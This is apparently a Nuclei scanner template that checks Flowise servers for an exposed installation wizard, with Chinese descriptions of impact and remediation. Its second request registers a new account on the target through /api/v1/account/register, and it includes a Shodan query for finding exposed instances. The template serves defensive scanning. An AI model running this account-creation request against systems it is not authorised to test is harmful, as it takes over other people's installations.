id: flowise-installer

info:
  name: Flowise 安装向导暴露
  author: pussycat0x
  severity: high
  description: |
    该模板用于核查 Flowise 安装向导暴露。该类问题通常源于安装、初始化、升级或配置向导在部署完成后仍可从公网访问。模板会向目标发送探测请求，并依据请求 `/organization-setup`、匹配 `status_code == 200`、匹配 `contains_all(body,"{{name}}","{{email}}","organization")`、匹配 `status_code == 201`等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可能完成初始化流程、创建管理员账户、覆盖配置或触发升级逻辑。
    - 在部分系统中，暴露安装入口还可能导致数据库连接信息泄露、站点被重新配置或业务被接管。
  remediation: |
    - 完成部署后立即删除、禁用或限制安装与升级入口。
    - 对初始化流程增加来源限制和一次性安装校验，避免公网直接访问。
    - 检查系统是否已被异常初始化或创建未知管理员账户，并轮换相关凭据。
  metadata:
    verified: true
    shodan-query: http.title:"Flowise - Build AI Agents, Visually"
  tags: misconfig,exposure,install,flowise,intrusive,vuln,ai

variables:
  name: "{{to_lower(rand_text_alpha(5))}}"
  password: "{{rand_text_alphanumeric(12)}}"
  email: "{{randstr}}@{{rand_base(5)}}.com"

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/organization-setup"

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "Flowise - Build AI Agents, Visually")'
          - 'status_code == 200'
        condition: and
        internal: true

  - raw:
      - |
        POST /api/v1/account/register HTTP/1.1
        Host: {{Hostname}}

        {"user":{"name":"{{name}}","email":"{{email}}","type":"pro","credential":"{{password}}"}}

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body,"{{name}}","{{email}}","organization")'
          - 'status_code == 201'
        condition: and
